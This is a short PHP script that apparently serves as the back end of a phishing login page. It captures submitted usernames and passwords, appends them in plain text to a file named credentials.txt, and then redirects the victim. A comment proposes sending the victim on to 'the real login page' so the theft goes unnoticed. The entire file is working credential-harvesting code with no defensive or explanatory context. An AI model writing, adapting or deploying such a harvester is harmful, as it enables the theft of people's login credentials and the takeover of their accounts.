<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
    fclose($file);

    // Redirect to a thank you page or the real login page
    header("Location: thank_you.html");
    exit;
}
?>
